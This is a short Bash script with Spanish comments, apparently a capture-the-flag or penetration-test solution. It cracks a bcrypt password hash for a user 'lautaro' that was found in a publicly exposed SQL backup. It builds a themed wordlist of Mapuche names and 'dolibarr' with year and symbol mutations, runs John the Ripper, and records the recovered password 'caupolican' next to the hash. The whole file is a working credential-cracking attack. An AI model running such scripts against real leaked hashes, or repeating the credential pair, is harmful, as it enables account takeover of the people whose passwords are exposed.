#!/bin/bash
# Crackeo del hash bcrypt de lautaro (backup_2019.sql publico en /old/)
# Password resultante: caupolican
set -euo pipefail
cd "$(dirname "$0")/.."
WORK=work

HASH='$2y$10$jZ8zaNNNJY6pyMbPvnXAPumwdgYXksY3z8ktGBZlSZX5om/jEtu/q'
echo "$HASH" > /tmp/lautaro.hash

cat > /tmp/cand.txt <<'EOF'
fresia
Fresia
kimun
Kimun
lautaro
Lautaro
galvarino
Galvarino
dolibarr
Dolibarr
mapuche
Mapuche
canelo
Canelo
wallmapu
machi
toqui
weichafe
araucania
caupolican
Caupolican
dolores
memoria
Memoria
EOF

echo "[*] diccionario tematico + mutaciones"
python3 - <<'PY' >> /tmp/cand.txt
base = ["fresia","kimun","lautaro","galvarino","dolibarr","mapuche","canelo","wallmapu",
        "machi","toqui","weichafe","araucania","caupolican","dolores","memoria"]
years = ["","1998","2018","2019","2020","2021","2022","2023","2024","2025","2026","123","1234","1","01"]
sufs  = ["","!","@","#",".","-","_","1","12","123","2024!","2026!"]
for b in base:
    for y in years:
        for s in sufs:
            print(b+y+s)
PY
sort -u /tmp/cand.txt -o /tmp/cand.txt

john --format=bcrypt --wordlist=/tmp/cand.txt /tmp/lautaro.hash 2>&1 | tail -4
john --show /tmp/lautaro.hash
